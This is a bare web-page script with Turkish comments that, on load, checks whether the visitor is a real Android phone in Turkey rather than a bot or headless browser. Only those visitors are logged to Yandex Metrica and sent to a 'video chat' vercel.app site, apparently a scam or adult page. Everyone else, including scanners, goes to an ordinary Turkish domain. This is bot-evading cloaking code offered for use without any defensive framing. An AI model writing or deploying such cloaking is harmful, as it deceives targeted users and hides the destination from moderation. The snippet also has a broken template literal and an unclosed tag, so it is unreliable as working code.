  <script>
    // Android cihaz tespiti (Gelişmiş)
    function isRealAndroid() {
      const ua = navigator.userAgent.toLowerCase();
      const touch = 'ontouchstart' in window;
      const bot = navigator.webdriver || /HeadlessChrome|PhantomJS/i.test(ua);

      // Daha esnek eşleşme
      return ua.includes('android') && !bot && touch;
    }

    // Türkiye kontrolü
    async function isFromTurkey() {
      try {
        const res = await fetch("https://api.country.is");
        const data = await res.json();
        return data.country === "TR";
      } catch {
        return true; // fallback
      }
    }

    async function redirect() {
      const android = isRealAndroid();
      const turkey = await isFromTurkey();

      if (android && turkey) {
        if (typeof ym !== 'undefined') {
          ym(103636543, 'reachGoal', 'android_redirect', {
            screen: ${screen.width}x${screen.height},
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
          });
        }
        window.location.href = "https://goruntulusohbetzamani.vercel.app/";
      } else {
        window.location.href = "https://www.kocalar.com.tr/";
      }
    }

    // Başlat
    window.addEventListener('load', () => {
      setTimeout(redirect, 800); // Azıcık bekletme
    });
